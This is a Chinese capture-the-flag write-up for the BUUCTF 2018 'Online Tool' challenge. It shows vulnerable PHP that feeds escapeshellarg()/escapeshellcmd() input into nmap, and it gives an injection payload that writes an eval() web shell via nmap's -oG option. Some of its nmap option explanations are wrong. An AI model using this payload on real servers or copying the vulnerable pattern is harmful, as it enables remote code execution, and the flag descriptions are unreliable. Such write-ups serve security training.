# BUUCTF 2018

## Web

### Online Tool

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

* REMOTE\_ADDR：表示发出请求的远程主机的 IP 地址
* X\_FORWARDED\_FOR：表示 HTTP 的请求端真实的 IP 地址
* `escapeshellarg()` ：把字符串转码为可以在 shell 命令里使用的参数
* `escapeshellcmd()` ：把字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义
* `chdir()` ：把当前的目录改变为指定的目录
* nmap：扫描站点的目录，寻找敏感文件
  * \-sT：TCP 扫描
  * \-T5：速度最快（牺牲部分准确性）
  * \-Pn：使用 Ping 扫描，显式地关闭端口扫描，用于主机发现
  * \--host-timeout 2：等待时间 2 ms
  * \-F：快速扫描
  * \-oG：将命令和结果写进文件

通过分析可以得出需要绕过 `escapeshellarg()` 和 `escapeshellcmd()` 两个函数。通过 `-oG` 进行输出包含 shell 的文件，下面是示例：

```php
<?php
$host = "'shell -oG shell.php'";
echo $host.'<br>'; // 'shell -oG shell.php'
$host = escapeshellarg($host);
echo $host.'<br>'; // ''\''shell -oG shell.php'\'''
$host = escapeshellcmd($host);
echo $host.'<br>'; // ''\\''shell -oG shell.php'\\'''
```

```bash
$ nmap -T5 -sT -Pn --host-timeout 2 -F ''\\''shell -oG shell.php'\\'''
# 输出文件名 shell.php\\
```

在 shell.php 后加上空格就可以使得文件名为 `shell.php` 了，payload `'<?php eval($_POST["data"]); ?> -oG shell.php '` 后再访问就可以发现 shell 上传成功了。

通过蚁剑连接 `http://xxx/f565ac1e9b5d20c5a41d0ba339fa528d/shell.php` 就可以在根目录找到 flag 了。
